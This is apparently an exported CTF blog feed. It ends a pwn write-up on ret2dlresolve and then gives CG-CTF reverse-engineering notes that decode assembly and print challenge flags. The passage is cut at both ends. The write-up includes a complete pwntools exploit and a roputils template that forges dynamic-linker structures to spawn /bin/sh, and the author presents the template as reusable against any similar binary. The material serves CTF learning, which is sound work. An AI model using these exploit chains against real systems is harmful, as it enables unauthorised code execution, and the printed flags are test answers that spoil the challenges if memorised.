len(rop.chain())</span><br></pre></td></tr></table></figure><ul><li><p>这里打印出来是82,rop链的自动对齐，所以接下来是参数内容/bin/sh</p><p>#### 第十部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rop.raw(sh+&apos;\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(100 - len(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><p>完整构造就这样完成了，接下来直接打就能成功了。<br>先贴上完整exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">offset = 44</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">io = process(&apos;./pwn&apos;)</span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(&apos;a&apos;*offset)</span><br><span class="line">rop.read(0, base_stage, 100)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(&apos;./pwn&apos;)</span><br><span class="line">plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 32</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym)/0x10</span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sys = flat([st_name, 0, 0, 0x12])</span><br><span class="line">index_offset = base_stage + 24 - rel_plt</span><br><span class="line">read_got = elf.got[&apos;setvbuf&apos;]</span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">sh = &apos;/bin/sh&apos;</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(base_stage+82)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line">rop.raw(&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">rop.raw(fake_sys_rel)</span><br><span class="line">rop.raw(align * &apos;a&apos;)</span><br><span class="line">rop.raw(fake_sys)</span><br><span class="line">rop.raw(&apos;system\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(80 - len(rop.chain())))</span><br><span class="line">print len(rop.chain())</span><br><span class="line">rop.raw(sh+&apos;\x00&apos;)</span><br><span class="line">rop.raw(&apos;a&apos;*(100 - len(rop.chain())))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>终于写完了这道题。。。不过好像跟我标题好像不太符合啊，通杀，如何通杀。。。</p><h2 id="通杀"><a href="#通杀" class="headerlink" title="通杀"></a>通杀</h2><ul><li>其实这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，你可以直接复制黏贴中间部分拿去打别的题目，也是能成功的，我测试了xctf2015的那道题，也就是ctf-wiki例题，以及iscc2019的题目都是一个套路</li><li>其实还有集成工具利用，叫roputils,这个也是一个库，专门用于对付ret2dllruntime</li><li>理解过后，这种题你会发觉很简单，因为利用方式单一，根本没有啥骚姿势学习了，都是一样的套路了<br><strong>接下来贴下roputils的利用方法，我根本没改什么，就是ctf-wiki的工具使用方法，改几个参数就行，我将需要改的参数提放到前面了</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">processName = &apos;pwn&apos;</span><br><span class="line">offset = 44</span><br><span class="line"></span><br><span class="line">r = process(&apos;./&apos; + processName)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">rop = ROP(&apos;./&apos; + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(&apos;.bss&apos;)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">## used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">## used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>是不是发觉精简好多，几乎不用写啥，我感觉这种题就是这样，原理难理解点，解题很简单，以后比赛遇到这种题，就拿这个exp改下offset和程序名，一波梭，有时候需要手动迁移下栈而已</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul><li>以后遇到高级ROP这种题就一把梭了</li><li>妈妈在也不用担心我遇到栈的这种问题了</li><li>我只分析了32位程序的这种题，64位题目的结构和大小也改了，不用利用工具也可以方便的搞定，具体自行尝试了</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CG-CTF南邮RE逆向题笔记</title>
      <link href="/2019/09/14/CG-CTF%E2%94%80%E2%95%A7%E2%95%99%E2%95%A9RE%E2%94%80%C2%B5%E2%95%A7%E2%89%A5%E2%95%A0%CE%93%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F/"/>
      <url>/2019/09/14/CG-CTF%E2%94%80%E2%95%A7%E2%95%99%E2%95%A9RE%E2%94%80%C2%B5%E2%95%A7%E2%89%A5%E2%95%A0%CE%93%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Hello，RE！"><a href="#1-Hello，RE！" class="headerlink" title="1.Hello，RE！"></a>1.Hello，RE！</h3><p>没什么好讲的，签到题，把获得的题目文件 1.exe 直接拖进IDA Pro即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public _main</span><br><span class="line">_main proc near</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">sub     esp, 90h</span><br><span class="line">call    ___main</span><br><span class="line">mov     dword ptr [esp], 410000h ; char *</span><br><span class="line">call    __Z6printfPKcz  ; printf(char const*,...)</span><br><span class="line">mov     dword ptr [esp+75h], 67616C66h</span><br><span class="line">mov     dword ptr [esp+79h], 6C65577Bh</span><br><span class="line">mov     dword ptr [esp+7Dh], 656D6F63h</span><br><span class="line">mov     dword ptr [esp+81h], 5F6F545Fh</span><br><span class="line">mov     dword ptr [esp+85h], 575F4552h</span><br><span class="line">mov     dword ptr [esp+89h], 646C726Fh</span><br><span class="line">mov     word ptr [esp+8Dh], 7D21h</span><br><span class="line">mov     byte ptr [esp+8Fh], 0</span><br><span class="line">jmp     short loc_401592</span><br></pre></td></tr></table></figure><p>有个 strcmp 函数，比较 v4 和 v5 地址的。选中 v5 ，发现倒序的 flag 字样。</p><p>按R即可获得Flag：flag{Welcome_To_RE_World!}</p><h3 id="2-ReadAsm2"><a href="#2-ReadAsm2" class="headerlink" title="2.ReadAsm2"></a>2.ReadAsm2</h3><p>单纯的汇编语言考察题目，题目有两段汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[] = &#123;<span class="number">0x0</span>,  <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x7e</span>, <span class="number">0x74</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>,</span><br><span class="line">                  <span class="number">0x55</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x4e</span>, <span class="number">0x66</span>, <span class="number">0x7b</span>,</span><br><span class="line">                  <span class="number">0x71</span>, <span class="number">0x4a</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x6b</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x66</span> , <span class="number">0x1c</span>&#125;;</span><br><span class="line">  func(input, <span class="number">28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,input+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开题目文件 2.asm 可获得第二段 func函数 汇编代码</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004004e6</span> &lt;func&gt;:<span class="type"></span></span><br><span class="line"><span class="type">  4004e6</span>: <span class="number">55</span>                    push   rbp</span><br><span class="line">  <span class="number">4004e7</span>: <span class="type">48 89 e5              mov    rbp</span>,rsp</span><br><span class="line">  <span class="number">4004</span>ea: <span class="type">48 89 7d e8           mov    QWORD PTR </span>[rbp<span class="number">-0x18</span>],rdi</span><br><span class="line">  <span class="number">4004</span>ee: <span class="type">89 75 e4              mov    DWORD PTR </span>[rbp<span class="number">-0x1c</span>],esi</span><br><span class="line">  <span class="number">4004</span>f1: <span class="type">c7 45 fc 01 00 00 00  mov    DWORD PTR </span>[rbp<span class="number">-0x4</span>],<span class="number">0x1</span></span><br><span class="line">  <span class="number">4004</span>f8: <span class="type">eb 28                 jmp    400522 </span>&lt;func+<span class="number">0x3c</span>&gt;</span><br><span class="line">  <span class="number">4004</span>fa: <span class="type">8b 45 fc              mov    eax</span>,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">  <span class="number">4004</span>fd: <span class="type">48 63 d0              movsxd rdx</span>,eax</span><br><span class="line">  <span class="number">400500</span>: <span class="type">48 8b 45 e8           mov    rax</span>,QWORD PTR [rbp<span class="number">-0x18</span>]</span><br><span class="line">  <span class="number">400504</span>: <span class="type">48 01 d0              add    rax</span>,rdx</span><br><span class="line">  <span class="number">400507</span>: <span class="type">8b 55 fc              mov    edx</span>,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">  <span class="number">40050</span>a: <span class="type">48 63 ca              movsxd rcx</span>,edx</span><br><span class="line">  <span class="number">40050</span>d: <span class="type">48 8b 55 e8           mov    rdx</span>,QWORD PTR [rbp<span class="number">-0x18</span>]</span><br><span class="line">  <span class="number">400511</span>: <span class="type">48 01 ca              add    rdx</span>,rcx</span><br><span class="line">  <span class="number">400514</span>: <span class="type">0f b6 0a              movzx  ecx</span>,BYTE PTR [rdx]</span><br><span class="line">  <span class="number">400517</span>: <span class="type">8b 55 fc              mov    edx</span>,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">  <span class="number">40051</span>a: <span class="type">31 ca                 xor    edx</span>,ecx</span><br><span class="line">  <span class="number">40051</span>c: <span class="type">88 10                 mov    BYTE PTR </span>[rax],dl</span><br><span class="line">  <span class="number">40051</span>e: <span class="type">83 45 fc 01           add    DWORD PTR </span>[rbp<span class="number">-0x4</span>],<span class="number">0x1</span></span><br><span class="line">  <span class="number">400522</span>: <span class="type">8b 45 fc              mov    eax</span>,DWORD PTR [rbp<span class="number">-0x4</span>]</span><br><span class="line">  <span class="number">400525</span>: <span class="type">3b 45 e4              cmp    eax</span>,DWORD PTR [rbp<span class="number">-0x1c</span>]</span><br><span class="line">  <span class="number">400528</span>: <span class="type">7e d0                 jle    4004fa </span>&lt;func+<span class="number">0x14</span>&gt;</span><br><span class="line">  <span class="number">40052</span>a: <span class="type">90                    nop</span></span><br><span class="line"><span class="type">  40052b</span>: <span class="number">5</span>d                    pop    rbp</span><br><span class="line">  <span class="number">40052</span>c: <span class="type">c3                    ret</span></span><br></pre></td></tr></table></figure><p>分析过程记录：</p><h4 id="（1）main-部分"><a href="#（1）main-部分" class="headerlink" title="（1）main() 部分"></a>（1）main() 部分</h4><p><code>0x</code> 表示十六进制。<br>flag 是对此 input 数组的操作组合而成。</p><p><a href="http://www.bluesock.org/~willg/dev/ascii.html" target="_blank" rel="noopener">http://www.bluesock.org/~willg/dev/ascii.html</a></p><h4 id="（2）函数调用部分"><a href="#（2）函数调用部分" class="headerlink" title="（2）函数调用部分"></a>（2）函数调用部分</h4><p><strong>4004e6</strong>：表示该指令对应的虚拟内存地址<br><strong>55</strong>：该指令对应的计算机指令</p><p>函数调用过程：</p><blockquote><p>入栈，将寄存器的值压入调用 bp 栈中<br>建立新栈帧，别掉函数栈帧栈底地址放入寄存器</p></blockquote><p>实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   rbp</span><br><span class="line">mov    rbp,rsp</span><br></pre></td></tr></table></figure><p>寄存器类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ax(accumulator): 可用于存放函数返回值</span><br><span class="line">bp(base pointer): 用于存放执行中的函数对应的栈帧的栈底地址</span><br><span class="line">sp(stack poinger): 用于存放执行中的函数对应的栈帧的栈顶地址</span><br><span class="line">ip(instruction pointer): 指向当前执行指令的下一条指令</span><br></pre></td></tr></table></figure><p>前缀加上 r 表示 64 位， e 表示 32 位，使用时表示该寄存器存储 xx 位的数据。</p><h4 id="（3）执行过程"><a href="#（3）执行过程" class="headerlink" title="（3）执行过程"></a>（3）执行过程</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004004e6</span> &lt;func&gt;:<span class="type"></span></span><br><span class="line"><span class="type">  4004e6</span>: <span class="number">55</span>                    push   rbp                         <span class="comment">/*函数调用</span></span><br><span class="line"><span class="comment">  4004e7: 48 89 e5              mov    rbp,rsp                              */</span></span><br><span class="line">  <span class="number">4004</span>ea: <span class="type">48 89 7d e8           mov    QWORD PTR </span>[rbp<span class="number">-0x18</span>],rdi       <span class="comment">//rdi 存第一个参数</span></span><br><span class="line">  <span class="number">4004</span>ee: <span class="type">89 75 e4              mov    DWORD PTR </span>[rbp<span class="number">-0x1c</span>],esi       <span class="comment">//esi 存第二个参数</span></span><br><span class="line">  <span class="number">4004</span>f1: <span class="type">c7 45 fc 01 00 00 00  mov    DWORD PTR </span>[rbp<span class="number">-0x4</span>],<span class="number">0x1</span>        <span class="comment">//在[rbp-0x4]写入 0x1</span></span><br><span class="line">  <span class="number">4004</span>f8: <span class="type">eb 28                 jmp    400522 </span>&lt;func+<span class="number">0x3c</span>&gt;</span><br><span class="line">  <span class="number">4004</span>fa: <span class="type">8b 45 fc              mov    eax</span>,DWORD PTR [rbp<span class="number">-0x4</span>]         <span class="comment">//把[rbp-0x4]的值送入 eax ,即 eax = 1</span></span><br><span class="line">  <span class="number">4004</span>fd: <span class="type">48 63 d0              movsxd rdx</span>,eax                         <span class="comment">//扩展,传送 rdx=1</span></span><br><span class="line">  <span class="number">400500</span>: <span class="type">48 8b 45 e8           mov    rax</span>,QWORD PTR [rbp<span class="number">-0x18</span>]        <span class="comment">//第一个参数 [rbp-0x18]，rax=input[0]</span></span><br><span class="line">  <span class="number">400504</span>: <span class="type">48 01 d0              add    rax</span>,rdx                         <span class="comment">//rax = input[1]</span></span><br><span class="line">  <span class="number">400507</span>: <span class="type">8b 55 fc              mov    edx</span>,DWORD PTR [rbp<span class="number">-0x4</span>]         <span class="comment">//第 6 行中存储的 0x1 ,传入 edx ,即 edx =1</span></span><br><span class="line">  <span class="number">40050</span>a: <span class="type">48 63 ca              movsxd rcx</span>,edx                          <span class="comment">//rcx=1</span></span><br><span class="line">  <span class="number">40050</span>d: <span class="type">48 8b 55 e8           mov    rdx</span>,QWORD PTR [rbp<span class="number">-0x18</span>]         <span class="comment">// rdx = input[0]</span></span><br><span class="line">  <span class="number">400511</span>: <span class="type">48 01 ca              add    rdx</span>,rcx                          <span class="comment">//rdx += rcx ,rdx = input[1]</span></span><br><span class="line">  <span class="number">400514</span>: <span class="type">0f b6 0a              movzx  ecx</span>,BYTE PTR [rdx]               <span class="comment">//ecx = input[1]</span></span><br><span class="line">  <span class="number">400517</span>: <span class="type">8b 55 fc              mov    edx</span>,DWORD PTR [rbp<span class="number">-0x4</span>]          <span class="comment">//edx = 0x1 </span></span><br><span class="line">  <span class="number">40051</span>a: <span class="type">31 ca                 xor    edx</span>,ecx                          <span class="comment">//edx ^= ecx ,原先 ecx 为 1100111，edx 为 0000001，操作后 edx 为 1100110，即 f</span></span><br><span class="line">  <span class="number">40051</span>c: <span class="type">88 10                 mov    BYTE PTR </span>[rax],dl                <span class="comment">//rax = dl</span></span><br><span class="line">  <span class="number">40051</span>e: <span class="type">83 45 fc 01           add    DWORD PTR </span>[rbp<span class="number">-0x4</span>],<span class="number">0x1</span>          <span class="comment">//[rbp-0x4]处为 0x1</span></span><br><span class="line">  <span class="number">400522</span>: <span class="type">8b 45 fc              mov    eax</span>,DWORD PTR [rbp<span class="number">-0x4</span>]          <span class="comment">//把[rbp-0x4]的值送入 eax，eax=1</span></span><br><span class="line">  <span class="number">400525</span>: <span class="type">3b 45 e4              cmp    eax</span>,DWORD PTR [rbp<span class="number">-0x1c</span>]         <span class="comment">// 比较操作，将[rbp-0x1c] 处的值与eax比较，改变状态位，eax=28时，ZF=1，否则ZF=0</span></span><br><span class="line">  <span class="number">400528</span>: <span class="type">7e d0                 jle    4004fa </span>&lt;func+<span class="number">0x14</span>&gt;               <span class="comment">//eax &lt; 28 时跳转至 4004fa   func(input, 28); ZF=1时跳出</span></span><br><span class="line">  <span class="number">40052</span>a: <span class="type">90                    nop</span></span><br><span class="line"><span class="type">  40052b</span>: <span class="number">5</span>d                    pop    rbp</span><br><span class="line">  <span class="number">40052</span>c: <span class="type">c3                    ret</span></span><br></pre></td></tr></table></figure><ul><li>-word 表示字<br>q 四字 d 双字<br>dword qword</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword 2*16 =32 位</span><br><span class="line">qword 4*16 = 64 位</span><br></pre></td></tr></table></figure><ul><li>PTR 指针（pointer）<br>没有寄存器名时， X ptr 指明内存单元的长度，X 在汇编指令中可以为word 或 byte 。</li><li>内存地址</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[rbp-0x18]</span><br></pre></td></tr></table></figure><ul><li>涉及指令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.movsxd 指令为扩展至零</span><br><span class="line">将32位的寄存器和内存操作数符号扩展到64位的寄存器</span><br><span class="line">2.逻辑异或运算指令 XOR </span><br><span class="line">XOR OPRD1,OPRD2 </span><br><span class="line">实现两个操作数按位‘异或’(异为真,相同为假)运算,结果送至目的操作数中.</span><br><span class="line">OPRD1&lt;--OPRD1 XOR OPRD2</span><br><span class="line">3.JLE</span><br><span class="line"> 小于等于时转移</span><br></pre></td></tr></table></figure><p>操作行为链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdx——rax</span><br><span class="line">edx——rcx</span><br><span class="line">rcx——rdx 作为累加</span><br></pre></td></tr></table></figure><p>简单来说就是input[i]*i，最后用ASCII码输出</p><p>我们来用Swift语言实现</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> inputs:[<span class="type">Int</span>] = [<span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x7e</span>, <span class="number">0x74</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>,<span class="number">0x55</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x4e</span>, <span class="number">0x66</span>, <span class="number">0x7b</span>,<span class="number">0x71</span>, <span class="number">0x4a</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x6b</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x66</span> , <span class="number">0x1c</span>]</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="type">Slove</span>(inputs: inputs,num: <span class="number">28</span>)</span><br><span class="line">    <span class="built_in">print</span>((flag))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Slove</span><span class="params">(inputs:Array&lt;Int&gt;,num:Int)</span></span>-&gt; <span class="type">String</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="string">" "</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>...num</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> char1 = <span class="type">Character</span>(<span class="type">UnicodeScalar</span>(inputs[i-<span class="number">1</span>]^i)!);</span><br><span class="line">        flag += <span class="type">String</span>(char1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>还可以使用Python语言来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(inputs, num)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, num):</span><br><span class="line">        flag += chr(inputs[i<span class="number">-1</span>] ^ i)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    inputs = [<span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x7e</span>, <span class="number">0x74</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>,<span class="number">0x55</span>, <span class="number">0x6a</span>, <span class="number">0x7f</span>, <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x4e</span>, <span class="number">0x66</span>, <span class="number">0x7b</span>,<span class="number">0x71</span>, <span class="number">0x4a</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x6b</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x66</span> , <span class="number">0x1c</span>]</span><br><span class="line">    flag = func(inputs, <span class="number">28</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可获得Flag：flag{read_asm_is_the_basic}</p><h3 id="3-Py交易"><a href="#3-Py交易" class="headerlink" title="3.Py交易"></a>3.Py交易</h3><p>根据题意可知，即为Python逆向题目，打开在线Python反编译应用，推荐：<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">https://tool.lu/pyc/</a></p><p>可获得反编译代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 